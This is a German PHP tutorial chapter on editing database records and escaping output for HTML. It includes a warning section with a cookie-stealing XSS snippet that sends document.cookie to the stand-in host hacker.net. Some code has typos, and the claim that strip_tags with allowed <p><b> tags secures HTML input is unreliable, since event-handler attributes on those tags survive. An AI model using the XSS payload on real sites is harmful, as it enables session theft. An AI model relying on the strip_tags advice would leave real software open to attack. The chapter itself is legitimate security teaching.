---
title: Daten Bearbeiten
order: 40
---

Wir wollen einen Datensatz aus der Datenbank laden, in einem Formular zur Bearbeitung anbieten, und dann wieder in der Datenbank speichern.

![Abbildung 150: Formular zum Bearbeiten einer Person](/images/person_edit.png)

Das Lesen des Datensatzes aus der Datenbank erfolgt nun auch mit einem prepared Statement:

<php caption="laden des Datensatzes, der editiert werden soll">
$sth = $dbh->prepare( "SELECT * FROM users WHERE id=?" );
$sth->execute( array( $id ) );
$sth->setFetchMode(PDO::FETCH_OBJ);
$person = $sth->fetch();
</php>

Bei der Darstellung des Bearbeitungs-Formulars werden die Daten nun als Standardwerte dargestellt. Das passiert bei Textfeldern mit dem Value-Attribute und bei Textareas als Inhalt des Tags:

<htmlcode>
  <input name="firstname" value="Tobias">
  <textarea name="description" rows="7">Webdesigner und Programmierer.</textarea>
</htmlcode>

Achtung: Falls in den Daten Anführungszeichen, kaufmännische Unds oder Kleiner-Zeichen vorkommen müssen diese für HTML escaped werden.  Hier ein Beispiel in MySQL:

<sql>
mysql> select firstname,description from users where id=438;
+-----------+--------------------------------+
| firstname | description                    |
+-----------+--------------------------------+
| Tobias    | Mein Lieblings-Tag ist <style> | 
+-----------+--------------------------------+
1 row in set (0.00 sec)
</sql>

So würde die Darstellung der Eingabefelder nicht funktionieren:

<htmlcode>
  <input name="firstname" value="Tobias "the coder" " />
  <textarea name="description" rows="7">Mein Lieblings-Tag: <style></textarea>
</htmlcode>

Richtig ist die Darstellung gewisser Zeichen als HTML entities:

<htmlcode>
  <input name="firstname" value="Tobias &quot;the coder&quot; " />
  <textarea name="description" rows="7">Mein Lieblings-Tag: &lt;style&gt;</textarea>
</htmlcode>

Diese Ersetzung wird mit der Funktion htmlspecialchars vorgenommen:

<php>
htmlspecialchars( $person->firstname  );
</php>

Zusammenfassend sieht die Darstellung des Eingabeformulars so aus:

<php caption="Darstellung eines Eingabe-Felds des Edit-Formulars mit PHP">
<p><label for="firstname">Vorname</label> 
<input name="firstname" value="<?= htmlspecialchars( $person->firstname ) ?>"></p>
</php>

Die veränderten Daten werden mit POST an person_edit.php geschickt. Aus den Daten wird ein UPDATE-Statement erstellt:

<php caption="Update der Daten von PHP aus">
$sth = $dbh->prepare(
  "UPDATE users SET
    firstname=?,surname=?,email=?,profile_visible=?,
    updated_at=NOW(),description=?,slug=?
   WHERE id=?");

$update_went_ok = $sth->execute(
        array(
          $_POST['firstname'],
          $_POST['surname'],
          $_POST['email'],
          $_POST['profile_visible'],
          $_POST['description'],
          $_POST['slug'],
          $_POST['id'],
        )
);

header("Location: person.php?pid=" . $_POST['id']);
exit;
</php>

Escapen von HTML
-----------------
Das Escapen der Daten für HTML hätten wir von Anfang an bei jeder Ausgabe von Daten aus der Datenbank durchführen müssen. Wir haben bisher einfach die Daten direkt mit echo ausgegeben:

<php caption="Ausgabe von Daten aus der Datenbank ohne html-escaping">
<?= $person->firstname ?>
<?= $person->surname ?>
hat insgesamt  <?= $no ?> Werke in dieser Datenbank.
// problematisch!
</php>

Wenn hier in der Description „Mein Lieblings-Tag ist &lt;style&gt;“ steht, und dieser Text einfach ausgegeben wird, dann „verschwindet“ der Rest der Webseite, weil er sich nun innerhalb eines Style-Tags befindet.

<php caption="Ausgabe von Daten aus der Datenbank mit html-escaping">
$username    = htmlspecialchars( $person->username     );
$firstname   = htmlspecialchars( $person->firstname    );
$surname     = htmlspecialchars( $person->surname      );
$description = htmlspecialchars( $person->description' );

echo <<<EOM
    <p>$anrede $vorname $nachname hat insgesamt $no Werke in dieser Datenbank.
    $ersie hat den Usernamen $username.</p>

    <div>$description</div>
EOM;
</php>

Damit funktioniert nun die Darstellung des Datensatzes richtig:

![Abbildung 151: Korrekte Darstellung eines Datensatzes mit kleiner-Zeichen](/images/image369.png)

 Darstellen von HTML
---------------------
Im letzten Beispielen wurde der eingegebene HTML-Tag sichtbar auf der Webseite angezeigt. Wie kann man HTML-Tags eingeben, abspeichern, und als HTML-Tags wieder anzeigen?

### Gefahren
Zuerst eine Warnung: Die Anzeige von HTML das von Fremden eingegeben wurde ist gefährlich! Dazu zwei Beispiele: Sie bauen ein Gästebuch in dem BesucherInnen beliebiges HTML abspeichern können. Herr Lauscher trägt dort ein Bild ein:

<htmlcode>
<img src="http://lauscher.net/bild.php?woher=gaestebuch_mmt" alt="harmloses bild">
</htmlcode>

Das Bild wird also nicht von Ihrem Webserver geladen, sondern vom Webserver von Herrn Lauscher. Und dort wird gleich ein php-Programm zum Erzeugen des Bildes aufgerufen. D.h. Herr Lauscher kann sehr bequem mit-loggen wie viele Zugriffe auf das Gästebuch erfolgen. Falls Herr Lauscher die Gästebuch-Besucher schon kennt (schon ein Cookie in Ihrem Browser gesetzt hat) kann er sie auch identifizieren.

Sie haben Herrn Lauscher also die Möglichkeit gegeben sehr viel über Ihre BesucherInne zu erfahren. So etwas ähnliches passiert z.B. wenn Sie Google Analytics in Ihre Webseite einbinden um Zugriffs-Statistiken zu erstellen: Google erfährt von jedem Zugriff auf Ihre Seite, Google kennt viele BesucherInnen schon (weil Sie bei gmail.com eingeloggt sind oder von einer vorhergehenden Suche noch ein Cookie haben.)

Im zweiten Beispiel gibt Frau Hacker neben einem Bild noch etwas Javascript ein:

<htmlcode>
Hallo Welt 

<img src="http://hacker.net/bild.php" alt="harmloses bild" id="hack_tool" />
<script>
   document.getElementById("hack_tool").src += "?keks=" + document.cookie;
</script>
</htmlcode>

Mit der einen Zeile Javascript wir das Cookie an die URL des Bildes angefügt, das Ergebnis ist z.B:

<htmlcode>
<img id="hack_tool" alt="harmloses bild" 
src="http://hacker.net/bild.php?keks=PHPSESSID=6b454e966f9fc9b9a9d5126ffb076115"/>
</htmlcode>

So kann Frau Hacker das Cookie einer BesucherIn Ihres Gästebuchs entwenden. Sie kann nun das Cookie verwenden um als eingeloggter User Ihre Seite zu benützen!

Lassen Sie niemals, niemals, niemals zu, dass Fremde Javascript in Ihre Site einspeisen können!

Noch hat unsere Applikation dieses Problem nicht: Wenn Frau Hacker Ihren Code z.B. in das Profil einer Person eingibt wir der Code htmlescaped angezeigt und „wirkt nicht“:

![Abbildung 152: Eingegebener HTML+Javascript-Code wird escaped und dargestellt](/images/image370.png)

### Sichere Eingabe von HTML

Für die Beispiel-Applikation wollen wir Zulassen, dass im Profil die HTML-Tags &lt;p&gt; und &lt;b&gt; verwendet werden können, mehr nicht. Dass es nur diese Tags und keine anderen sind wird bei der Eingabe und der Bearbeitung sicher gestellt:

<php>
$description = strip_tags( $_POST['description'], "<p><b>" );
</php>

Nun können Sie auch die Ausgabe des Profils umstellen und auf das escapen verzichten:

Die Eingabe des HTML-Codes können Sie mit einem Javascript-Editor wie TinyMCE erleichtern. TinyMCE verwandelt eine normale Textarea in einen wysiwyg-Editor:

![Abbildung 153: Normale Textarea (oben) kann mit TinyMCE in einen wysiwyg-Editor (unten) verwandelt werden](/images/image371.png)

Mit HTML5 gibt es auch die möglichkeit ohen Textfeld, mit content-editable einen Editor zu erstellen. Ein
Beispiel dafür ist der Aloha Editor:

![Abbildung 153b: Aloha Editor](/images/aloha.png)


